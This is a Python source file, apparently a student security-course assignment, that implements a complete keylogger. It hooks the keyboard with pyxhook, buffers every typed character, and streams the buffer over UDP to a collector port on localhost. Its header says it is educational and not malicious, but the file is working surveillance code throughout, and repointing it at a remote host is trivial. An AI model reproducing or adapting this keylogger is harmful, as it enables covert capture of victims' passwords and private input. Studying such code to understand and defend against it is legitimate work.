"""
Authors:
    Dominick Taylor (dxt9140@g.rit.edu)
    Bikash (bm7514@g.rit.edu)
    Isza

Created: 2/28/2018

A simple keylogger file that captures user key events using the pyxhook package.
Note, this is NOT intended as a malicious program. It is used to understand
security principles and demonstrate mastery of secure programming techniques.
"""

import pyxhook
import time
import threading
import socket

running = True
string = ""

# Email Logs
class DataThread(threading.Thread):

    def __init__(self):
        threading.Thread.__init__(self)
        self.event = threading.Event()

    def run(self):
        global running
        global string

        hostname = 'localhost'
        port = 35476

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        connection = (hostname, port)

        while running:
            try:
                if len(string) < 1024:
                    pass
                else:
                    data = string[0:1023]
                    string = string[1024:]
                    s.sendto( data, connection )
            except:
                pass

        s.sendto(string, connection)
        s.sendto("done", connection)
        s.close()


    def cancel(self):
        self.event.set()

def keyDownEvent( event ):
    global running
    global string

    if event.Ascii == 8:
        string += "<bs>"

    # Only write printable characters
    elif event.Ascii >= 32:
        string += chr(event.Ascii)

    # Esc or ctrl-c ends the program
    elif event.Ascii == 27 or event.Ascii == 3:
        running = False


def main():
    global running

    # Create some thread objects
    keyboard_hook = pyxhook.HookManager()
    sender = DataThread()

    # Keyboard hook initialization
    keyboard_hook.KeyDown = keyDownEvent
    keyboard_hook.HookKeyboard()

    # Start the other threads
    keyboard_hook.start()
    sender.start()

    while running:
        time.sleep(.1)

    # close thread
    sender.cancel()
    keyboard_hook.cancel()

if __name__ == '__main__':
    main()

#------------------------------------
# End of file

